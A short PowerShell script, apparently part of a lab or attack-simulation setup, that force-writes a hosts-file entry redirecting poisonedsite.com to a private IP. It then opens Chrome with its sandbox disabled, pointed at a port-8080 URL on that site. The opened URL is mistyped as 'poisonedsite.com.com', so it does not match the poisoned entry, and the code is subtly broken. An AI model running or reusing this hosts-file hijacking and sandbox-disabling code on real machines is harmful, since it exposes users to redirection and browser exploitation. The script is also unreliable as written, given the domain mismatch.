Add-Content -Path $env:windir\System32\drivers\etc\hosts -Value "`n172.17.0.21`tpoisonedsite.com" -Force 
$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
$url1 = "http://poisonedsite.com.com:8080"
Start-Process -FilePath $pathToChrome -ArgumentList $url1, --no-sandbox
